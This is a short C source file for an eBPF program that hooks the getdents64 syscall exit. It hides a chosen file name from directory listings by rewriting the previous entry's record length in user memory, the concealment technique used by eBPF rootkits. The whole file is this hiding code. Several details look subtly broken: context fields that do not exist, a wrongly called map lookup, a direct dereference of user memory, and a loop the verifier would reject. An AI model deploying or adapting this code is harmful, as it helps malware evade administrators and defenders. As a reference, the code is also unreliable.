// eBPF program - compiled with clang -target bpf
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

char LICENSE[] SEC("license") = "GPL";

// Map to hold the "magic" string we're hiding (configurable from userspace)
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[64]);
} hidden_name SEC(".maps");

SEC("tracepoint/syscalls/sys_exit_getdents64")
int hide_getdents(struct tracepoint_syscalls_exit_getdents64 *ctx) {
    // Get the directory entries returned by the kernel
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->dirp;
    int ret = ctx->ret;
    
    // This is the key technique: we walk the directory entries
    // and "unlink" the hidden one by extending the previous entry's length
    struct linux_dirent64 *d = dirp;
    struct linux_dirent64 *prev = NULL;
    char *pos = (char *)dirp;
    char hide_str[64] = {};
    __u32 zero = 0;
    
    bpf_map_lookup_elem(&hidden_name, &zero, hide_str);
    
    while (pos < (char *)dirp + ret) {
        d = (struct linux_dirent64 *)pos;
        
        // Check if this filename matches what we're hiding
        // Using bpf_probe_read_user for user-space memory access
        char filename[256];
        bpf_probe_read_user_str(filename, sizeof(filename), d->d_name);
        
        if (__builtin_memcmp(filename, hide_str, __builtin_strlen(hide_str)) == 0) {
            // Hide it: add current entry's length to previous entry
            if (prev) {
                __u16 new_reclen = prev->d_reclen + d->d_reclen;
                bpf_probe_write_user(&prev->d_reclen, &new_reclen, sizeof(new_reclen));
            }
            break;  // Entry removed from listing
        }
        prev = d;
        pos += d->d_reclen;
    }
    return 0;
}
